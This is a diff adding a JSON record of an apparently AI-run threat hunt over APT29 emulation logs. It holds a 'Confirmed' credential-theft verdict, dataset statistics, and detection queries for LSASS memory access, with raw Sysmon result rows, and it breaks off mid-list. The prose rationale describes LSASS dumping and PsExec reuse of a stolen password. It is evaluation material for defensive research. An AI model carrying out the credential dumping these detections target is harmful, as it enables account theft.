@@ -1,0 +1,3644 @@
+{
+  "hypothesis": "An adversary who compromised Windows hosts in this network stole credentials from them (MITRE ATT&CK tactic: Credential Access).",
+  "run": "20261017-011128-baseline-exp-A2",
+  "profile": "baseline",
+  "model": "deepseek-flash",
+  "started_at": "2026-10-16T17:11:28+00:00",
+  "mcp_tools": [
+    "list_data_sources",
+    "get_fields",
+    "search",
+    "count",
+    "aggregate",
+    "timeline",
+    "esql",
+    "get_event",
+    "get_registry"
+  ],
+  "finished_at": "2026-10-16T17:15:22+00:00",
+  "seconds": 233.9,
+  "llm_calls": 23,
+  "llm_tokens": {
+    "prompt": 1116504,
+    "completion": 44210
+  },
+  "mcp_calls": 92,
+  "profile_settings": {
+    "thinking": true,
+    "temperature": 0.0,
+    "structured": false,
+    "verdict": "llm",
+    "gate": false
+  },
+  "frame": {
+    "tactics": [
+      "credential-access"
+    ],
+    "restated": "An adversary with access to Windows hosts on this network stole credentials from those hosts.",
+    "what_would_confirm": "Observable evidence such as LSASS process access or memory dumps, suspicious use of credential-dumping tools (e.g., Mimikatz, ProcDump, comsvcs.dll), access to SAM/SECURITY/SYSTEM registry hives or NTDS.dit, Kerberoasting or AS-REP roasting attempts, or anomalous authentication using stolen credentials from compromised Windows hosts.",
+    "what_would_refute": "Observable absence of credential theft indicators on the compromised Windows hosts, including no LSASS access or memory dumping, no credential-dump tool execution, no unauthorized access to credential stores or registry hives, and no authentication or privilege escalation activity attributable to stolen credentials."
+  },
+  "verdict": {
+    "verdict": "Confirmed",
+    "rationale": "The credential-access hypothesis is confirmed by F01: on scranton.dmevals.local, a hidden PowerShell process launched by control.exe from a steganographic payload in monkey.png accessed lsass.exe with full-access masks 0x1f3fff and 0x1fffff and injected an unbacked remote thread into LSASS (Sysmon EID 10 and EID 8, StartModule '-'), which is a high-confidence T1003.001 LSASS credential dumping pattern. Independent Security EID 4656 corroborates the same handle requests. The same activity chain also compiled C# in memory, wrote a .pfx, and then used PsExec64 with the cleartext password of DMEVALS\\pbeesly against NASHUA, further supporting credential theft and reuse. F02-F04 are benign/not-evidenced for Get-Process -IncludeUserName, SAM hive dumping, and Kerberoasting, but they do not refute the confirmed LSASS credential dumping. Thus the hypothesis that an adversary stole credentials from compromised Windows hosts is confirmed.",
+    "method": "LLM judgement"
+  },
+  "data": {
+    "query_id": "q-c1d5f3128e",
+    "datasets": [
+      {
+        "dataset": "windows.other",
+        "data_stream": "logs-windows.other-default",
+        "documents": 216,
+        "first_event": "2020-05-02T02:56:47.000Z",
+        "last_event": "2020-05-02T03:23:08.000Z",
+        "hosts": {
+          "scranton.dmevals.local": 127,
+          "newyork.dmevals.local": 72,
+          "nashua.dmevals.local": 12,
+          "utica.dmevals.local": 5
+        },
+        "observers": {},
+        "top_event_codes": {
+          "5858": 49,
+          "5857": 36,
+          "6": 11,
+          "263": 8,
+          "7036": 8,
+          "16": 5,
+          "7045": 5,
+          "11": 4,
+          "2004": 4,
+          "2006": 4,
+          "7040": 4,
+          "1": 3,
+          "10": 3,
+          "10016": 3,
+          "5860": 3,
+          "98": 3,
+          "1500": 2,
+          "20": 2,
+          "20523": 2,
+          "258": 2,
+          "32": 2,
+          "55": 2,
+          "10148": 1,
+          "10149": 1,
+          "1074": 1,
+          "109": 1,
+          "1136": 1,
+          "1149": 1,
+          "12": 1,
+          "13": 1,
+          "14": 1,
+          "153": 1,
+          "16962": 1,
+          "172": 1,
+          "18": 1,
+          "2002": 1,
+          "2010": 1,
+          "21": 1,
+          "22": 1,
+          "23": 1
+        },
+        "top_event_actions": {},
+        "sources": {
+          "apt29-windows-other": {
+            "template": "windows-other",
+            "channel": "push",
+            "decision": "created"
+          }
+        }
+      },
+      {
+        "dataset": "windows.powershell",
+        "data_stream": "logs-windows.powershell-default",
+        "documents": 10979,
+        "first_event": "2020-05-02T02:56:14.000Z",
+        "last_event": "2020-05-02T03:21:30.000Z",
+        "hosts": {
+          "scranton.dmevals.local": 8602,
+          "newyork.dmevals.local": 2185,
+          "nashua.dmevals.local": 192
+        },
+        "observers": {},
+        "top_event_codes": {
+          "800": 5113,
+          "4103": 5080,
+          "4104": 414,
+          "600": 138,
+          "12039": 46,
+          "8196": 46,
+          "4100": 45,
+          "400": 21,
+          "53504": 16,
+          "403": 13,
+          "40961": 13,
+          "8197": 12,
+          "40962": 11,
+          "8193": 3,
+          "8194": 3,
+          "8195": 3,
+          "4101": 2
+        },
+        "top_event_actions": {},
+        "sources": {
+          "apt29-powershell": {
+            "template": "windows-powershell",
+            "channel": "stream",
+            "decision": "created"
+          }
+        }
+      },
+      {
+        "dataset": "windows.security",
+        "data_stream": "logs-windows.security-default",
+        "documents": 41002,
+        "first_event": "2020-05-02T02:55:25.000Z",
+        "last_event": "2020-05-02T03:28:09.000Z",
+        "hosts": {
+          "scranton.dmevals.local": 24938,
+          "newyork.dmevals.local": 10438,
+          "nashua.dmevals.local": 4063,
+          "utica.dmevals.local": 1563
+        },
+        "observers": {},
+        "top_event_codes": {
+          "4658": 10973,
+          "4656": 5497,
+          "4690": 5471,
+          "4663": 5337,
+          "5156": 3163,
+          "5447": 2587,
+          "5158": 1896,
+          "4703": 1802,
+          "4673": 934,
+          "4688": 460,
+          "4689": 398,
+          "5154": 362,
+          "4624": 297,
+          "4627": 297,
+          "4634": 236,
+          "4672": 212,
+          "4945": 176,
+          "4670": 143,
+          "5145": 121,
+          "5441": 57,
+          "4674": 55,
+          "5140": 42,
+          "5157": 40,
+          "5446": 40,
+          "4661": 37,
+          "4657": 36,
+          "4769": 28,
+          "4957": 27,
+          "5379": 26,
+          "4798": 25,
+          "4799": 24,
+          "4697": 23,
+          "4648": 15,
+          "4660": 15,
+          "4611": 14,
+          "4702": 14,
+          "4768": 14,
+          "5058": 12,
+          "5061": 12,
+          "4622": 10
+        },
+        "top_event_actions": {},
+        "sources": {
+          "apt29-security": {
+            "template": "windows-security",
+            "channel": "push",
+            "decision": "reused"
+          }
+        }
+      },
+      {
+        "dataset": "windows.sysmon",
+        "data_stream": "logs-windows.sysmon-default",
+        "documents": 143884,
+        "first_event": "2020-05-02T02:55:23.551Z",
+        "last_event": "2020-05-02T03:28:17.683Z",
+        "hosts": {
+          "scranton.dmevals.local": 97452,
+          "nashua.dmevals.local": 24789,
+          "newyork.dmevals.local": 11240,
+          "utica.dmevals.local": 10403
+        },
+        "observers": {},
+        "top_event_codes": {
+          "12": 61151,
+          "10": 39283,
+          "7": 20259,
+          "13": 17541,
+          "11": 1649,
+          "3": 1229,
+          "9": 652,
+          "1": 447,
+          "23": 422,
+          "5": 401,
+          "18": 362,
+          "2": 209,
+          "8": 95,
+          "17": 84,
+          "22": 81,
+          "15": 18,
+          "4": 1
+        },
+        "top_event_actions": {},
+        "sources": {
+          "apt29-sysmon": {
+            "template": "windows-sysmon",
+            "channel": "pull",
+            "decision": "reused"
+          }
+        }
+      },
+      {
+        "dataset": "zeek",
+        "data_stream": "logs-zeek-default",
+        "documents": 2140,
+        "first_event": "2020-04-30T00:06:38.899Z",
+        "last_event": "2020-04-30T00:45:00.760Z",
+        "hosts": {},
+        "observers": {
+          "bobs.bigwheel.local": 1725,
+          "simplerockbuild.simplerock.lan": 415
+        },
+        "top_event_codes": {},
+        "top_event_actions": {
+          "conn": 613,
+          "files": 448,
+          "ssl": 378,
+          "x509": 378,
+          "dce_rpc": 123,
+          "http": 62,
+          "dns": 53,
+          "kerberos": 35,
+          "dpd": 12,
+          "smb_files": 12,
+          "weird": 12,
+          "smb_mapping": 11,
+          "notice": 2,
+          "pe": 1
+        },
+        "sources": {
+          "zeek-nashua": {
+            "template": "zeek",
+            "channel": "pull",
+            "decision": "reused"
+          },
+          "zeek-scranton": {
+            "template": "zeek",
+            "channel": "pull",
+            "decision": "created"
+          }
+        }
+      }
+    ],
+    "non_overlapping_time_windows": [
+      "windows.other [2020-05-02T02:56:47.000Z .. 2020-05-02T03:23:08.000Z] and zeek [2020-04-30T00:06:38.899Z .. 2020-04-30T00:45:00.760Z] do not overlap",
+      "windows.powershell [2020-05-02T02:56:14.000Z .. 2020-05-02T03:21:30.000Z] and zeek [2020-04-30T00:06:38.899Z .. 2020-04-30T00:45:00.760Z] do not overlap",
+      "windows.security [2020-05-02T02:55:25.000Z .. 2020-05-02T03:28:09.000Z] and zeek [2020-04-30T00:06:38.899Z .. 2020-04-30T00:45:00.760Z] do not overlap",
+      "windows.sysmon [2020-05-02T02:55:23.551Z .. 2020-05-02T03:28:17.683Z] and zeek [2020-04-30T00:06:38.899Z .. 2020-04-30T00:45:00.760Z] do not overlap"
+    ]
+  },
+  "datasets": [
+    "windows.other",
+    "windows.powershell",
+    "windows.security",
+    "windows.sysmon",
+    "zeek"
+  ],
+  "coverage": {
+    "T1003.001": {
+      "name": "OS Credential Dumping: LSASS Memory",
+      "cells": {
+        "windows.sysmon": "check",
+        "windows.powershell": "check"
+      }
+    },
+    "T1003.002": {
+      "name": "OS Credential Dumping: Security Account Manager",
+      "cells": {
+        "windows.sysmon": "check",
+        "windows.security": "check"
+      }
+    },
+    "T1003.003": {
+      "name": "OS Credential Dumping: NTDS",
+      "cells": {
+        "windows.sysmon": "check",
+        "windows.security": "check"
+      }
+    },
+    "T1558.003": {
+      "name": "Steal or Forge Kerberos Tickets: Kerberoasting",
+      "cells": {
+        "windows.security": "check",
+        "zeek": "check"
+      }
+    },
+    "T1003.004": {
+      "name": "OS Credential Dumping: LSA Secrets / Cached Domain Credentials",
+      "cells": {
+        "windows.sysmon": "check",
+        "windows.other": "check"
+      }
+    }
+  },
+  "technique_status": {
+    "T1003.001": {
+      "name": "OS Credential Dumping: LSASS Memory",
+      "status": "not_triaged",
+      "reason": "5 checks, 978 hits"
+    },
+    "T1003.002": {
+      "name": "OS Credential Dumping: Security Account Manager",
+      "status": "not_triaged",
+      "reason": "3 checks, 2 hits"
+    },
+    "T1003.003": {
+      "name": "OS Credential Dumping: NTDS",
+      "status": "not_observed",
+      "reason": "3 checks, 0 hits"
+    },
+    "T1003.004": {
+      "name": "OS Credential Dumping: LSA Secrets / Cached Domain Credentials",
+      "status": "not_triaged",
+      "reason": "2 checks, 6625 hits"
+    },
+    "T1558.003": {
+      "name": "Steal or Forge Kerberos Tickets: Kerberoasting",
+      "status": "not_triaged",
+      "reason": "3 checks, 70 hits"
+    }
+  },
+  "checks": [
+    {
+      "technique": "T1003.001",
+      "dataset": "windows.sysmon",
+      "tool": "aggregate",
+      "args": {
+        "dataset": "windows.sysmon",
+        "query": "event.code:10 AND win.TargetImage:*lsass*",
+        "field": "win.SourceImage"
+      },
+      "purpose": "Stack every process-access event whose target is LSASS by the accessing image; rare/unsigned images touching lsass.exe are the primary credential-dumping signal.",
+      "check_id": "C001",
+      "query_id": "q-0c41343298",
+      "error": null,
+      "total": 326,
+      "result": {
+        "query_id": "q-0c41343298",
+        "total": 326,
+        "field": "win.SourceImage",
+        "buckets": [
+          {
+            "value": "C:\\windows\\system32\\svchost.exe",
+            "count": 289
+          },
+          {
+            "value": "C:\\Packages\\Plugins\\Microsoft.Azure.Security.IaaSAntimalware\\1.5.5.9\\AntimalwareConfig.exe",
+            "count": 15
+          },
+          {
+            "value": "C:\\WindowsAzure\\Packages\\Telemetry\\WindowsAzureTelemetryService.exe",
+            "count": 13
+          },
+          {
+            "value": "C:\\windows\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe",
+            "count": 2
+          },
+          {
+            "value": "C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "count": 2
+          },
+          {
+            "value": "C:\\windows\\system32\\wininit.exe",
+            "count": 2
+          },
+          {
+            "value": "C:\\windows\\system32\\csrss.exe",
+            "count": 1
+          },
+          {
+            "value": "C:\\windows\\system32\\services.exe",
+            "count": 1
+          },
+          {
+            "value": "C:\\windows\\system32\\wsmprovhost.exe",
+            "count": 1
+          }
+        ],
+        "other_count": 0
+      }
+    },
+    {
+      "technique": "T1003.001",
+      "dataset": "windows.sysmon",
+      "tool": "aggregate",
+      "args": {
+        "dataset": "windows.sysmon",
+        "query": "event.code:10 AND win.TargetImage:*lsass*",
+        "field": "win.GrantedAccess"
+      },
+      "purpose": "Surface rare access masks on LSASS (e.g. 0x1010 / 0x1410 / 0x143a / 0x1fffff) which indicate read-memory/handle-duplication instead of benign query access.",
+      "check_id": "C002",
+      "query_id": "q-7c6a6e8483",
+      "error": null,
+      "total": 326,
+      "result": {
+        "query_id": "q-7c6a6e8483",
+        "total": 326,
+        "field": "win.GrantedAccess",
+        "buckets": [
+          {
+            "value": "0x1000",
+            "count": 293
+          },
+          {
+            "value": "0x1400",
+            "count": 24
+          },
+          {
+            "value": "0x1fffff",
+            "count": 3
+          },
+          {
+            "value": "0x101001",
+            "count": 2
+          },
+          {
+            "value": "0x1f3fff",
+            "count": 2
+          },
+          {
+            "value": "0x1000000",
+            "count": 1
+          },
+          {
+            "value": "0x3000",
+            "count": 1
+          }
+        ],
+        "other_count": 0
+      }
+    },
+    {
+      "technique": "T1003.001",
+      "dataset": "windows.sysmon",
+      "tool": "esql",
+      "args": {
+        "query": "FROM logs-windows.sysmon-default METADATA _id, _index | WHERE event.code == \"10\" AND TO_LOWER(win.TargetImage) LIKE \"*lsass*\" | KEEP @timestamp, host.name, win.SourceImage, win.TargetImage, win.GrantedAccess, win.CallTrace, _id, _index"
+      },
+      "purpose": "Read the individual LSASS-access events (host, source image, granted access, call trace) for any suspicious entry returned by the aggregations.",
+      "check_id": "C003",
+      "query_id": "q-c55d9268d6",
+      "error": null,
+      "total": 326,
+      "result": {
+        "query_id": "q-c55d9268d6",
+        "columns": [
+          "@timestamp",
+          "host.name",
+          "win.SourceImage",
+          "win.TargetImage",
+          "win.GrantedAccess",
+          "win.CallTrace",
+          "_id",
+          "_index"
+        ],
+        "values": [
+          [
+            "2020-05-02T03:24:18.178Z",
+            "nashua.dmevals.local",
+            "C:\\windows\\system32\\svchost.exe",
+            "C:\\windows\\system32\\lsass.exe",
+            "0x1000",
+            "C:\\windows\\SYSTEM32\\ntdll.dll+9c584|C:\\windows\\System32\\KERNELBASE.dll+6a8b5|c:\\windows\\system32\\lsm.dll+ff97|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a86f|C:\\windows\\System32\\RPCRT4.dll+...(+263 chars; use get_event)",
+            "AaFFkNQ25mySA1MuaKzP",
+            ".ds-logs-windows.sysmon-default-2026.10.16-000001"
+          ],
+          [
+            "2020-05-02T03:24:18.178Z",
+            "nashua.dmevals.local",
+            "C:\\windows\\system32\\svchost.exe",
+            "C:\\windows\\system32\\lsass.exe",
+            "0x1000",
+            "C:\\windows\\SYSTEM32\\ntdll.dll+9c584|C:\\windows\\System32\\KERNELBASE.dll+6a8b5|c:\\windows\\system32\\lsm.dll+10daa|c:\\windows\\system32\\lsm.dll+1008d|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a...(+298 chars; use get_event)",
+            "AaFFkNQ25mySA1MuaKzQ",
+            ".ds-logs-windows.sysmon-default-2026.10.16-000001"
+          ],
+          [
+            "2020-05-02T03:22:02.803Z",
+            "nashua.dmevals.local",
+            "C:\\windows\\system32\\svchost.exe",
+            "C:\\windows\\system32\\lsass.exe",
+            "0x1000",
+            "C:\\windows\\SYSTEM32\\ntdll.dll+9c584|C:\\windows\\System32\\KERNELBASE.dll+6a8b5|c:\\windows\\system32\\lsm.dll+ff97|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a86f|C:\\windows\\System32\\RPCRT4.dll+...(+263 chars; use get_event)",
+            "AaFFkNQ25mySA1MsSfal",
+            ".ds-logs-windows.sysmon-default-2026.10.16-000001"
+          ],
+          [
+            "2020-05-02T03:22:02.803Z",
+            "nashua.dmevals.local",
+            "C:\\windows\\system32\\svchost.exe",
+            "C:\\windows\\system32\\lsass.exe",
+            "0x1000",
+            "C:\\windows\\SYSTEM32\\ntdll.dll+9c584|C:\\windows\\System32\\KERNELBASE.dll+6a8b5|c:\\windows\\system32\\lsm.dll+10daa|c:\\windows\\system32\\lsm.dll+1008d|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a...(+298 chars; use get_event)",
+            "AaFFkNQ25mySA1MsSfan",
+            ".ds-logs-windows.sysmon-default-2026.10.16-000001"
+          ],
+          [
+            "2020-05-02T03:22:01.381Z",
+            "nashua.dmevals.local",
+            "C:\\windows\\system32\\svchost.exe",
+            "C:\\windows\\system32\\lsass.exe",
+            "0x1000",
+            "C:\\windows\\SYSTEM32\\ntdll.dll+9c584|C:\\windows\\System32\\KERNELBASE.dll+6a8b5|c:\\windows\\system32\\lsm.dll+ff97|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a86f|C:\\windows\\System32\\RPCRT4.dll+...(+263 chars; use get_event)",
+            "AaFFkNQ25mySA1MsRcXh",
+            ".ds-logs-windows.sysmon-default-2026.10.16-000001"
+          ],
+          [
+            "2020-05-02T03:22:01.381Z",
+            "nashua.dmevals.local",
+            "C:\\windows\\system32\\svchost.exe",
+            "C:\\windows\\system32\\lsass.exe",
+            "0x1000",
+            "C:\\windows\\SYSTEM32\\ntdll.dll+9c584|C:\\windows\\System32\\KERNELBASE.dll+6a8b5|c:\\windows\\system32\\lsm.dll+10daa|c:\\windows\\system32\\lsm.dll+1008d|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a...(+298 chars; use get_event)",
+            "AaFFkNQ25mySA1MsRcXj",
+            ".ds-logs-windows.sysmon-default-2026.10.16-000001"
+          ],
+          [
+            "2020-05-02T03:22:01.319Z",
+            "nashua.dmevals.local",
+            "C:\\windows\\system32\\svchost.exe",
+            "C:\\windows\\system32\\lsass.exe",
+            "0x1000",
+            "C:\\windows\\SYSTEM32\\ntdll.dll+9c584|C:\\windows\\System32\\KERNELBASE.dll+6a8b5|c:\\windows\\system32\\lsm.dll+ff97|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a86f|C:\\windows\\System32\\RPCRT4.dll+...(+263 chars; use get_event)",
+            "AaFFkNQ25mySA1MsRs2s",
+            ".ds-logs-windows.sysmon-default-2026.10.16-000001"
+          ],
+          [
+            "2020-05-02T03:22:01.319Z",
+            "nashua.dmevals.local",
+            "C:\\windows\\system32\\svchost.exe",
+            "C:\\windows\\system32\\lsass.exe",
+            "0x1000",
+            "C:\\windows\\SYSTEM32\\ntdll.dll+9c584|C:\\windows\\System32\\KERNELBASE.dll+6a8b5|c:\\windows\\system32\\lsm.dll+10daa|c:\\windows\\system32\\lsm.dll+1008d|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a...(+298 chars; use get_event)",
+            "AaFFkNQ25mySA1MsRs2u",
+            ".ds-logs-windows.sysmon-default-2026.10.16-000001"
+          ],
+          [
+            "2020-05-02T03:21:54.503Z",
+            "nashua.dmevals.local",
+            "C:\\windows\\system32\\svchost.exe",
+            "C:\\windows\\system32\\lsass.exe",
+            "0x1000",
+            "C:\\windows\\SYSTEM32\\ntdll.dll+9c584|C:\\windows\\System32\\KERNELBASE.dll+6a8b5|c:\\windows\\system32\\lsm.dll+ff97|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a86f|C:\\windows\\System32\\RPCRT4.dll+...(+263 chars; use get_event)",
+            "AaFFkNQ25mySA1MsOxh0",
+            ".ds-logs-windows.sysmon-default-2026.10.16-000001"
+          ],
+          [
+            "2020-05-02T03:21:54.503Z",
+            "nashua.dmevals.local",
+            "C:\\windows\\system32\\svchost.exe",
+            "C:\\windows\\system32\\lsass.exe",
+            "0x1000",
+            "C:\\windows\\SYSTEM32\\ntdll.dll+9c584|C:\\windows\\System32\\KERNELBASE.dll+6a8b5|c:\\windows\\system32\\lsm.dll+10daa|c:\\windows\\system32\\lsm.dll+1008d|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a...(+298 chars; use get_event)",
+            "AaFFkNQ25mySA1MsOxh2",
+            ".ds-logs-windows.sysmon-default-2026.10.16-000001"
+          ],
+          [
+            "2020-05-02T03:21:54.363Z",
+            "nashua.dmevals.local",
+            "C:\\windows\\system32\\svchost.exe",
+            "C:\\windows\\system32\\lsass.exe",
+            "0x1000",
+            "C:\\windows\\SYSTEM32\\ntdll.dll+9c584|C:\\windows\\System32\\KERNELBASE.dll+6a8b5|c:\\windows\\system32\\lsm.dll+ff97|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a86f|C:\\windows\\System32\\RPCRT4.dll+...(+263 chars; use get_event)",
+            "AaFFkNQ25mySA1MrOvdA",
+            ".ds-logs-windows.sysmon-default-2026.10.16-000001"
+          ],
+          [
+            "2020-05-02T03:21:54.363Z",
+            "nashua.dmevals.local",
+            "C:\\windows\\system32\\svchost.exe",
+            "C:\\windows\\system32\\lsass.exe",
+            "0x1000",
+            "C:\\windows\\SYSTEM32\\ntdll.dll+9c584|C:\\windows\\System32\\KERNELBASE.dll+6a8b5|c:\\windows\\system32\\lsm.dll+10daa|c:\\windows\\system32\\lsm.dll+1008d|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a...(+298 chars; use get_event)",
+            "AaFFkNQ25mySA1MrOvdC",
+            ".ds-logs-windows.sysmon-default-2026.10.16-000001"
+          ],
+          [
+            "2020-05-02T03:15:03.894Z",
+            "nashua.dmevals.local",
+            "C:\\windows\\system32\\svchost.exe",
+            "C:\\windows\\system32\\lsass.exe",
+            "0x1000",
+            "C:\\windows\\SYSTEM32\\ntdll.dll+9c584|C:\\windows\\System32\\KERNELBASE.dll+6a8b5|c:\\windows\\system32\\lsm.dll+ff97|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a86f|C:\\windows\\System32\\RPCRT4.dll+...(+263 chars; use get_event)",
+            "AaFFkNQ25mySA1RjDyQi",
+            ".ds-logs-windows.sysmon-default-2026.10.16-000001"
+          ],
+          [
+            "2020-05-02T03:15:03.894Z",
+            "nashua.dmevals.local",
+            "C:\\windows\\system32\\svchost.exe",
+            "C:\\windows\\system32\\lsass.exe",
+            "0x1000",
+            "C:\\windows\\SYSTEM32\\ntdll.dll+9c584|C:\\windows\\System32\\KERNELBASE.dll+6a8b5|c:\\windows\\system32\\lsm.dll+10daa|c:\\windows\\system32\\lsm.dll+1008d|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a...(+298 chars; use get_event)",
+            "AaFFkNQ25mySA1RjDyQj",
+            ".ds-logs-windows.sysmon-default-2026.10.16-000001"
+          ],
+          [
+            "2020-05-02T03:13:49.586Z",
+            "nashua.dmevals.local",
+            "C:\\windows\\system32\\svchost.exe",
+            "C:\\windows\\system32\\lsass.exe",
+            "0x1000",
+            "C:\\windows\\SYSTEM32\\ntdll.dll+9c584|C:\\windows\\System32\\KERNELBASE.dll+6a8b5|c:\\windows\\system32\\lsm.dll+10daa|c:\\windows\\system32\\lsm.dll+1008d|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a...(+298 chars; use get_event)",
+            "AaFFkNQ25mySA1RoJLmG",
+            ".ds-logs-windows.sysmon-default-2026.10.16-000001"
+          ],
+          [
+            "2020-05-02T03:13:49.586Z",
+            "nashua.dmevals.local",
+            "C:\\windows\\system32\\svchost.exe",
+            "C:\\windows\\system32\\lsass.exe",
+            "0x1000",
+            "C:\\windows\\SYSTEM32\\ntdll.dll+9c584|C:\\windows\\System32\\KERNELBASE.dll+6a8b5|c:\\windows\\system32\\lsm.dll+ff97|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a86f|C:\\windows\\System32\\RPCRT4.dll+...(+263 chars; use get_event)",
+            "AaFFkNQ25mySA1RoJLmh",
+            ".ds-logs-windows.sysmon-default-2026.10.16-000001"
+          ],
+          [
+            "2020-05-02T03:12:46.768Z",
+            "nashua.dmevals.local",
+            "C:\\windows\\system32\\svchost.exe",
+            "C:\\windows\\system32\\lsass.exe",
+            "0x1000",
+            "C:\\windows\\SYSTEM32\\ntdll.dll+9c584|C:\\windows\\System32\\KERNELBASE.dll+6a8b5|c:\\windows\\system32\\lsm.dll+ff97|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a86f|C:\\windows\\System32\\RPCRT4.dll+...(+263 chars; use get_event)",
+            "AaFFkNQ25mySA1RoJ7pG",
+            ".ds-logs-windows.sysmon-default-2026.10.16-000001"
+          ],
+          [
+            "2020-05-02T03:12:46.768Z",
+            "nashua.dmevals.local",
+            "C:\\windows\\system32\\svchost.exe",
+            "C:\\windows\\system32\\lsass.exe",
+            "0x1000",
